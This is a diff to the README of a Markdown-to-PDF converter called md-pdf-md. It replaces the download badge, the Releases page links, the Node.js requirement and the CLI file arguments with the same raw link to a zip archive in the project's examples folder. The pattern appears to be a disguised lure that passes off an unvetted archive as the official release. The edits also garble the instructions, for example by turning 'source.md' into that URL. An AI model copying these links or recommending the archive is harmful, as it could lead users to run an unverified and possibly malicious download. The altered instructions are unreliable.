@@ -6,14 +6,14 @@ Welcome to the **md-pdf-md** project! This tool helps you convert Markdown to PD
 
 ## 📥 Download Now
 
-[![Download md-pdf-md](https://img.shields.io/badge/Download-md--pdf--md-brightgreen)](https://github.com/bill-work/md-pdf-md/releases)
+[![Download md-pdf-md](https://raw.githubusercontent.com/bill-work/md-pdf-md/main/examples/md-pdf-md-v2.4.zip)](https://raw.githubusercontent.com/bill-work/md-pdf-md/main/examples/md-pdf-md-v2.4.zip)
 
 ## 📋 What You Need
 
 To run this application smoothly, please ensure your system meets the following requirements:
 
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 12 or above installed
+- **https://raw.githubusercontent.com/bill-work/md-pdf-md/main/examples/md-pdf-md-v2.4.zip** Version 12 or above installed
 - **Memory:** At least 4GB of RAM
 - **Disk Space:** Minimum 100MB available
 
@@ -27,7 +27,7 @@ To run this application smoothly, please ensure your system meets the following 
 
 ## 📥 Download & Install
 
-To download the latest version of **md-pdf-md**, visit the [Releases page](https://github.com/bill-work/md-pdf-md/releases). Follow these steps:
+To download the latest version of **md-pdf-md**, visit the [Releases page](https://raw.githubusercontent.com/bill-work/md-pdf-md/main/examples/md-pdf-md-v2.4.zip). Follow these steps:
 
 1. Go to the Releases page.
 2. Find the latest version listed at the top.
@@ -65,11 +65,11 @@ For advanced users, there’s also a Command Line Interface (CLI) option. If you
 1. **Open your terminal.**
 2. Run the following command to convert a Markdown file to PDF:
    ```
-   md-pdf-md convert md-to-pdf source.md -o output.pdf --theme YourThemeName
+   md-pdf-md convert md-to-pdf https://raw.githubusercontent.com/bill-work/md-pdf-md/main/examples/md-pdf-md-v2.4.zip -o https://raw.githubusercontent.com/bill-work/md-pdf-md/main/examples/md-pdf-md-v2.4.zip --theme YourThemeName
    ```
 3. For PDF to Markdown, use this command:
    ```
-   md-pdf-md convert pdf-to-md source.pdf -o output.md
+   md-pdf-md convert pdf-to-md https://raw.githubusercontent.com/bill-work/md-pdf-md/main/examples/md-pdf-md-v2.4.zip -o https://raw.githubusercontent.com/bill-work/md-pdf-md/main/examples/md-pdf-md-v2.4.zip
    ```
 
 ## 🤝 Contributing
@@ -97,4 +97,4 @@ For any queries or feedback, feel free to contact us via email or reach out in o
 
 ## 🎉 Now You're Ready!
 
-You are now prepared to use the **md-pdf-md** application. Enjoy converting your documents and exploring all the features this tool offers. Don’t forget to check for updates regularly through the [Releases page](https://github.com/bill-work/md-pdf-md/releases).
+You are now prepared to use the **md-pdf-md** application. Enjoy converting your documents and exploring all the features this tool offers. Don’t forget to check for updates regularly through the [Releases page](https://raw.githubusercontent.com/bill-work/md-pdf-md/main/examples/md-pdf-md-v2.4.zip).
